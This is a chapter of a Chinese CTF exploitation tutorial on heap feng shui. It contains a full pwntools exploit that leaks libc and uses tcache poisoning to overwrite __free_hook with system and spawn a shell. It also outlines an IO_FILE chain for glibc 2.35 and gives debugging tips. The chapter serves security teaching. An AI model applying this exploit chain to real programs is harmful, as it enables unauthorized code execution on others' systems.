# 第 25 章 堆风水实战

> 堆利用的精髓不在某个单独的技巧，而在「堆风水」——精心规划每一次分配和释放，让堆内存按你的意愿布局。这一章用两道综合题把前面所有技术串起来。

---

## 25.1 什么是堆风水

**堆风水（Heap Feng Shui）** 指通过精确控制 malloc/free 的顺序和大小，让堆内存呈现出有利于利用的布局。

核心思想：

```text
- 想要 chunk 相邻？连续分配相同大小
- 想要 chunk 进入特定的 bin？控制大小和 free 顺序
- 想要 tcache 满载？连续 free 8 个同大小 chunk
- 想要制造重叠？利用 UAF / off-by-one / double free
```

堆风水是堆利用的「内功心法」，前面学的各种 attack 是「招式」。只有招式没有内功，遇到变形题就无从下手。

## 25.2 实战一：glibc 2.31 下的 tcache poisoning + __free_hook

### 题目

一个菜单式堆管理器（add/delete/edit/show），delete 后指针不清零（UAF），glibc 2.31。

完整的利用链：

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./heap_chall')
libc = ELF('./libc.so.6')

p = process(elf.path)

def add(idx, size, data):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'>> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def show(idx):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# ====== 第一步：泄露 libc（unsorted bin leak）======
# 分配大块绕过 tcache
add(0, 0x500, b'A' * 8)      # size 0x510 > 0x410，进 unsorted bin
add(1, 0x20, b'guard')       # 防止和 top chunk 合并
delete(0)                     # chunk 0 进 unsorted bin
show(0)                       # UAF 读 fd
leak = u64(p.recvline().strip()[:6].ljust(8, b'\x00'))
libc_base = leak - 0x1ebbe0   # main_arena + 96 的偏移（根据实际 libc 调整）
log.success(f'libc base: {hex(libc_base)}')

# ====== 第二步：tcache poisoning ======
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

# 用掉一些 tcache 槽位，确保我们的 chunk 进 tcache
add(2, 0x30, b'B' * 8)       # chunk size 0x40
delete(2)                     # 进 tcache[3]
edit(2, p64(free_hook))       # 改 fd → free_hook

add(3, 0x30, b'C' * 8)       # 返回原 chunk 2
add(4, 0x30, p64(system))    # 返回 free_hook，写入 system

# ====== 第三步：getshell ======
add(5, 0x30, b'/bin/sh\x00')
delete(5)                     # free("/bin/sh") → system("/bin/sh")
p.interactive()
```

### 关键点解析

1. **为什么先分配 guard chunk？** 防止 freed 的大块和 top chunk 合并（合并后 fd/bk 不会指向 main_arena）。
2. **为什么用 0x500 的大块？** tcache 最大只到 0x410，大块才会进入 unsorted bin，fd/bk 才指向 main_arena。
3. **偏移 0x1ebbe0 怎么来？** 泄露的 fd 指向 `main_arena + 96`，用 gdb 计算 `&main_arena + 96 - libc_base`。不同 libc 版本不同。

## 25.3 实战二：glibc 2.35 下的 IO_FILE 利用预告

glibc 2.35 移除了 hooks，经典的 `__free_hook` 利用失效。现代堆题的出路是 **IO_FILE 利用**。

简化利用链：

```text
1. 泄露 libc（unsorted bin leak）
2. tcache poisoning → 分配到 _IO_2_1_stdout_ 附近
3. 改写 stdout 的 flags 和 vtable 指针
4. 程序调用 puts/printf 时触发 IO_FILE 利用
5. 泄露更多信息或 getshell
```

具体技术会在第 26 章详细讲解。这里你只需要知道：**堆利用的最终目标从「改 hook」变成了「改 IO 结构」**。

## 25.4 堆风水的基本原则

总结几条实用的堆风水原则：

### 原则一：先画布局图

在做任何利用之前，先画出堆的当前布局：

```text
0x555555559000  [chunk 0: 0x510 - freed - unsorted]
0x555555559510  [chunk 1: 0x30 - allocated - guard]
0x555555559540  [chunk 2: 0x40 - freed - tcache]
0x555555559580  [top chunk: 0x20e01]
```

每分配/释放一次，更新布局图。

### 原则二：注意 tcache 的状态

glibc 2.26+，小块优先进 tcache。 tacache 满了（7 个）才会进 fastbin/bin。规划布局时必须考虑 tcache 的占用情况。

### 原则三：避免意外合并

free 相邻的两个 chunk 会触发合并。如果想保持 chunk 独立，中间放一个「哨兵」chunk（已分配，不释放）。

### 原则四：泄露和利用分开

先用一次运行泄露地址，再用另一次运行（同样的输入）完成利用。不要试图在一次交互里同时完成（除非程序有循环）。

## 25.5 调试技巧

堆利用调试的几个实用技巧：

```gdb
# 在每个 malloc/free 后下断点观察堆
catch malloc
catch free

# pwndbg 的堆可视化
vis_heap_chunks

# 查看 bins
bins

# 查看 tcache
tcache

# 查看某个 chunk
p *(mchunkptr)0x555555559010

# 追踪某个地址的变化
watch *(long*)0x555555559020
```

> 🔥 **实战建议**：找 3~5 道 glibc 2.31 的堆题（推荐 BUUCTP 的 `actf_2019_babynote`、`[OG]house_of_grey`），从泄露 libc 开始，独立写出完整 exp。卡住时用 gdb 逐步观察堆的变化。

## 25.6 小结

这一章我们通过两道综合题，把堆利用的技术串了起来：

- **堆风水**：通过控制 malloc/free 的顺序和大小，规划堆布局
- **glibc 2.31 利用链**：unsorted bin leak → tcache poisoning → __free_hook → getshell
- **glibc 2.35 的变化**：hooks 被移除，转向 IO_FILE 利用
- **调试技巧**：用 gdb/pwndbg 观察堆的每一步变化
